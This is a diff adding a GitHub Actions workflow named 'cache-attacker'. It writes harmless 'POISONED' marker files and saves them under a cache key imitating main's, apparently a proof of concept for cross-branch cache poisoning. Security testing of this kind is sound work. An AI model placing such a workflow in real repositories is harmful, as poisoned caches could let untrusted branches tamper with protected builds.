@@ -1,0 +1,26 @@
+name: cache-attacker
+on:
+  push:
+    branches: ['cache-attacker/**']
+  workflow_dispatch: {}
+
+permissions:
+  contents: read
+
+jobs:
+  poison_cache:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Write poison payload
+        shell: bash
+        run: |
+          mkdir -p payload
+          echo "POISONED-BY=cache-attacker/test" > payload/branch.txt
+          echo "POISONED=YES" > payload/sha.txt
+          date -u > payload/ts.txt
+          cat payload/branch.txt
+      - name: Save with main's key name (collision attempt)
+        uses: actions/cache/save@v4
+        with:
+          path: payload
+          key: ghhunt-cache-key-main
